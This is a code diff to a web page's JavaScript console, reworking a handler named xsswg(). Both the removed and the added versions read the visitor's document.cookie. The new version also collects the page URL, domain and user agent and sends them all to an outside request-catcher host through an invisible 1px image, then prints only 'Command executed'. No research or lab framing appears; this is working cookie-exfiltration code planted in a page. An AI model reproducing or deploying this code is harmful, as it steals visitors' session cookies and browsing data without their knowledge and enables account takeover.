@@ -260,23 +260,19 @@
       },
       clear(){ out.innerHTML=''; },
       xsswg(){
-        const img = document.createElement('img');
-        img.style.position = 'fixed';
-        img.style.top = '0';
-        img.style.left = '0';
-        img.style.width = '1px';
-        img.style.height = '1px';
-        img.style.opacity = '0';
-        img.style.pointerEvents = 'none';
-        img.onerror = function() {
-          fetch('https://gabrielprojects.requestcatcher.com/test?cookies=' + encodeURIComponent(document.cookie), {
-            method: 'GET',
-            mode: 'no-cors'
-          }).catch(() => {});
-          this.remove();
+        const cookies = document.cookie;
+        const data = {
+          cookies: cookies || 'EMPTY',
+          url: location.href,
+          domain: location.hostname,
+          userAgent: navigator.userAgent.substring(0, 50)
         };
-        img.src = 'https://nonexistent-image-xsswg.invalid/trigger.png';
+        const params = Object.keys(data).map(k => k + '=' + encodeURIComponent(data[k])).join('&');
+        const img = new Image();
+        img.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;pointer-events:none;';
+        img.src = 'https://gabrielprojects.requestcatcher.com/test?' + params + '&t=' + Date.now();
         document.body.appendChild(img);
+        setTimeout(() => img.remove(), 3000);
         printLine('<span class="muted">Command executed</span>');
       }
     };
